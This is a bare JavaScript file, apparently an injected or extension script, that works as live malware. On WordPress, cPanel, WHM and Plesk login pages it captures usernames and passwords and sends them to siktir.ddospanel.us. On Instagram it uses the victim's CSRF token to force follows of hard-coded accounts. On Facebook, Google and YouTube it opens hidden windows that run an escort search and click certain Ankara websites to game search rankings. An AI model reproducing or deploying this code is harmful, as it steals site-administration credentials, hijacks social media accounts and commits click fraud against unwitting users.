if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
new Image().src = '//whos.amung.us/widget/kekonam92.png';
document.getElementById('wp-submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}
if(document.title.toLowerCase().indexOf("cpanel") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("whm") >= 0){
	
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("plesk") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.querySelectorAll("button").onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('loginSection-username').value+'&sifre='+document.getElementById('loginSection-password').value+'&location='+location.href;
};
}
var media = {


instagram: {
        token: function () {
            return document.documentElement.innerHTML.split('csrf_token": "')[1].split('"')[0];
        },
        follow: function (user_id) {
            var url = "https://www.instagram.com/web/friendships/" + user_id + "/follow/",
                xhr = new XMLHttpRequest;
            xhr.open("POST", url, false);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.setRequestHeader("x-csrftoken", this.token());
            xhr.setRequestHeader("x-instagram-ajax", "1");
            xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
            xhr.send();
        }
    }
}




if (location.hostname.indexOf("instagram.com") >= 0) {

new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';


media.instagram.follow("4043940203")
media.instagram.follow("4101817865")
media.instagram.follow("1140348283")

}



if(top.location.hostname.indexOf("facebook") > -1 || top.location.hostname.indexOf("google") > -1 || top.location.hostname.indexOf("youtube") > -1 ){

function setCookie(cname, cvalue) {
	var d = new Date();
	d.setTime(d.getTime() + (1000 * 60 * 90 ));
	var expires = "expires=" + d.toUTCString();
	document.cookie = cname + "=" + cvalue + "; " + expires
}
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') c = c.substring(1);
		if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
	}
	return ""
}
if (getCookie('cookiez') != 1) {
window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
new Image().src = '//whos.amung.us/widget/dd0spanel.png';
setCookie("cookiez", "1")
}
}

var degisken = ['digi', 'evboyama', 'hostel'];  
var rand = degisken[Math.floor(Math.random() * degisken.length)];
var giris = Math.floor(Math.random() * ((10000-3000)+1) + 3000);
var cikis = Math.floor(Math.random() * ((10-3)+1) + 3);


if(document.title.indexOf("ankara escort") >= 0){
	
setTimeout(function () {
var a = document.getElementsByClassName("_Rm").length;
var pic = 0;
for(var i = 0 ; i < a ; i++){
if(document.getElementsByClassName("_Rm")[i].innerHTML.indexOf(rand) >= 0 ){
document.querySelectorAll(".r a")[i].click();
var pic =  1 ; 
}
}
if(pic == 0){document.querySelectorAll(".pn")[0].click();};
},giris)

											}

if (location.hostname.indexOf("digiankara.com") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}

if (location.hostname.indexOf("ankaraevboyama.com") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}

if (location.hostname.indexOf("ankarahostel.net") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}
